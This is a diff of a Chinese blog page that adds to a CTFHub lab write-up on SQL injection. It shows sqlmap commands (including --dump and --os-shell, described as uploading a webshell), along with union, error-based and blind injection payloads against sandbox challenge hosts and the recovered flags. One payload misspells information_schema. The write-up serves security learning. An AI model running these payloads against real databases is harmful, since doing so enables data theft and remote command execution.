@@ -31,19 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>CTFHub-4 - Artemis</title>
+  <title>SQL注入 - Artemis</title>
   <meta name="keywords" content="-CTFHub,null">
   <meta desc name="description" content="最是人间留不住，朱颜辞镜花辞树。 - weiwei - Artemis">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTFHub-4">
+<meta property="og:title" content="SQL注入">
 <meta property="og:url" content="http://example.com/2023/09/12/CTFHub-4/index.html">
 <meta property="og:site_name" content="Artemis">
 <meta property="og:description" content="SQL注入一、整数型注入方法一	SQL注入1、SQLmap爆出数据库信息 1python sqlmap.py -u &quot;http:&#x2F;&#x2F;challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;1&quot; --current-db  12[16:29:30] [INFO] fetching current databasecurren">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-09-12T09:15:58.000Z">
-<meta property="article:modified_time" content="2023-09-27T16:11:55.245Z">
+<meta property="article:modified_time" content="2024-04-13T13:49:35.548Z">
 <meta property="article:author" content="weiwei">
 <meta property="article:tag" content="-CTFHub">
 <meta name="twitter:card" content="summary">
@@ -1758,7 +1758,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1712682919166),
+    lastupdate: new Date(1713201822796),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2522,7 +2522,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        CTFHub-4
+        SQL注入
       </h1>
       <div class='new-meta-box'>
         
@@ -2589,8 +2589,49 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;c738d407d82740b4fa840800&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>
 
+<hr>
+<p><strong>-r</strong></p>
+<p>将网站发送至burp，通过不断增加’(单引号)查看是否存在SQL注入漏洞如：</p>
+<ol>
+<li>?id&#x3D;1’</li>
+<li>?id&#x3D;1’’</li>
+<li>?id&#x3D;1’’’</li>
+<li>…</li>
+</ol>
+<p>然后将数据包全部复制，并在sqlmap文件夹下新建target1.txt，将其复制进其中后，打开该文件目录下的cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.exe -r target1.txt</span><br></pre></td></tr></table></figure>
 
-
+<p>它将去扫描其中的文本信息</p>
+<hr>
+<p><strong>–cookie</strong></p>
+<p>进行身份认证</p>
+<hr>
+<p><strong>–data&#x3D;</strong></p>
+<p>post传参</p>
+<hr>
+<p><strong>–dump</strong></p>
+<p>脱库</p>
+<hr>
+<p><strong>–batch</strong></p>
+<p>默认用户选择（y&#x2F;n）</p>
+<hr>
+<p><strong>–dbs</strong></p>
+<p>枚举数据库</p>
+<hr>
+<p><strong>-D、-T、-C</strong></p>
+<hr>
+<p>–os-shell</p>
+<ul>
+<li><p>必要条件</p>
+<ul>
+<li>拥有网站的读写权限</li>
+<li>Secure_file_priv参数为空或者为指定路径</li>
+</ul>
+<p>–os-shell主要是通过上传一个salmap的马，然后通过马来进行命令执行</p>
+</li>
+</ul>
+<p><img src="/CTFHub-4.assets/image-20240413213948274.png" class="lazyload" data-srcset="/CTFHub-4.assets/image-20240413213948274.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240413213948274"></p>
+<p><img src="/CTFHub-4.assets/image-20240413214043247.png" class="lazyload" data-srcset="/CTFHub-4.assets/image-20240413214043247.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240413214043247"></p>
 <p>####方法二	手动注入</p>
 <p>1、使用order by n 语句查询字段数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 2</span><br></pre></td></tr></table></figure>
@@ -2623,9 +2664,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1 union select * from news where id=-1 union select 1,group_concat(flag) from sqli.flag</span><br><span class="line">ID: 1</span><br><span class="line">Data: ctfhub&#123;9e78719b9f362a4058891f1f&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h3><h4 id="方法一SQLmap注入"><a href="#方法一SQLmap注入" class="headerlink" title="方法一	SQLmap注入"></a>方法一	SQLmap注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure>
+<h3 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h3><p><img src="/CTFHub-4.assets/image-20240413211250855.png" class="lazyload" data-srcset="/CTFHub-4.assets/image-20240413211250855.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240413211250855"></p>
+<h4 id="方法一SQLmap注入"><a href="#方法一SQLmap注入" class="headerlink" title="方法一	SQLmap注入"></a>方法一	SQLmap注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure>
 
-<h4 id="方法二手动注入"><a href="#方法二手动注入" class="headerlink" title="方法二	手动注入"></a>方法二	手动注入</h4><p>1、查询当前使用的数据库：sqli</p>
+<h4 id="方法二手动注入"><a href="#方法二手动注入" class="headerlink" title="方法二	手动注入"></a>方法二	手动注入</h4><blockquote>
+<p>updatexml(xml_document,xpath,xml_document)</p>
+<p>extractvalue(xml_document,xpath)</p>
+<p>flood()</p>
+<p>exp()</p>
+</blockquote>
+<p>1、查询当前使用的数据库：sqli</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e, database(),0x7e),1)</span><br><span class="line">-1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select updatexml(1, concat(0x7e, database(),0x7e),1)</span><br><span class="line">查询错误: XPATH syntax error: &#x27;~sqli~&#x27;</span><br></pre></td></tr></table></figure>
@@ -2653,8 +2701,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <ul>
 <li>利用ASCII码</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr(database(),1,1)))=115		#得出第一个为s</span><br><span class="line">-1 and (ascii(substr(database(),2,1)))=		#得出第二个为...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr(database(),1,1)))=115		#得出第一个为s</span><br><span class="line">-1 and (ascii(mid(database(),2,1)))=xxx		#得出第二个为...</span><br><span class="line">substr与mid：截取结果的值，从第一个字符开始，截取1个字符（区别不大）</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>可使用burp进行爆破——sniper（1种）</p>
+</blockquote>
 <ul>
 <li>利用sleep()</li>
 </ul>
@@ -2663,10 +2714,22 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>依次得出4个为sqli</p>
 <p>3、判断表名</p>
 <ul>
+<li>判断表的个数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from ingormation_schema.tables where table_schema=database())=4</span><br><span class="line">判断表的个数，正确回显正常</span><br><span class="line">count()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可使用burp进行爆破——Cluster bomb（多种）</p>
+</blockquote>
+<ul>
 <li>利用ASCII</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=102		#得出第一个为f</span><br><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))= 		#得出第一个为...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=102		#得出第一个为f </span><br><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))= 		#得出第二个为...</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>ascii() 从1开始，substr从0开始</p>
+<p>limit 0,1 爆第一个表；limit 1,1 爆第二个表</p>
+</blockquote>
 <ul>
 <li>利用sleep()</li>
 </ul>
@@ -2731,10 +2794,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-09-28T00:11:55+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-04-13T21:49:35+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 28, 2023</p>
+    <p>更新于：Apr 13, 2024</p>
   </a>
 </div>
 
@@ -2757,7 +2820,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/09/12/CTFHub-4/&title=SQL注入 - Artemis&summary="
           
           >
           
@@ -2769,7 +2832,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/09/12/CTFHub-4/&title=SQL注入 - Artemis&summary="
           
           >
           
@@ -2781,7 +2844,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/09/12/CTFHub-4/&title=SQL注入 - Artemis&summary="
           
           >
           
@@ -2815,7 +2878,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class="prev-next">
       
         <a class='prev' href='/2023/09/13/CTFHub-5/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>CTFHub-5</p>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>备份文件下载</p>
           <p class='content'>备份文件下载一、网站源码
 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
 
@@ -3733,7 +3796,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"最是人间留不住，朱颜辞镜花辞树。"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Artemis"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/09/12/CTFHub-4/","name":"CTFHub-4"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Artemis","url":"http://example.com/","keywords":null,"description":"最是人间留不住，朱颜辞镜花辞树。","author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"最是人间留不住，朱颜辞镜花辞树。"},"publisher":{"@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTFHub-4","description":"最是人间留不住，朱颜辞镜花辞树。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/09/12/CTFHub-4/"},"author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Artemis","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/09/12/CTFHub-4/","wordCount":0,"datePublished":"2023-09-12T09:15:58.000Z","dateModified":"2023-09-27T16:11:55.245Z","keywords":"-CTFHub","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"最是人间留不住，朱颜辞镜花辞树。"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Artemis"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/09/12/CTFHub-4/","name":"SQL注入"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Artemis","url":"http://example.com/","keywords":null,"description":"最是人间留不住，朱颜辞镜花辞树。","author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"最是人间留不住，朱颜辞镜花辞树。"},"publisher":{"@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQL注入","description":"最是人间留不住，朱颜辞镜花辞树。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/09/12/CTFHub-4/"},"author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Artemis","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/09/12/CTFHub-4/","wordCount":0,"datePublished":"2023-09-12T09:15:58.000Z","dateModified":"2024-04-13T13:49:35.548Z","keywords":"-CTFHub","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
